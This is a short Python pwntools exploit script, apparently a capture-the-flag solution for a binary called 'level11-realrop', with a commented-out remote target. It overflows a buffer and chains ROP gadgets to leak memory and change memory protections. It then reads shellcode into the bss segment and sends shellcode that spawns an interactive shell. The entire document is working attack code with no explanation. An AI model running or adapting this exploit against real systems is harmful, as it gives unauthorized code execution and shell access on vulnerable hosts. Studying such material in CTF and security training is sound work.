from pwn import *
context.log_level="debug"

r=process("./level11-realrop")
#r=remote("pwn.sixstars.team",22011)

print r.pid
pause()

read=0x080480FD
write=0x08048115
addesp=0x08048198
rop=0x0804811A
bss=0x8048800

r.recv()
sh='a'*0x10
sh+=p32(write)+p32(addesp)+p32(1)+p32(0x8048000)+p32(0x7d)
sh+='a'*4*5
sh+=p32(rop)+p32(addesp)+p32(0x8048000)+p32(0x1000)+p32(7)
sh+='a'*4*5
sh+=p32(read)+p32(bss)+p32(0)+p32(bss)+p32(0x100)

r.sendline(sh)
r.recv()
r.sendline(asm(shellcraft.sh()))

r.interactive()
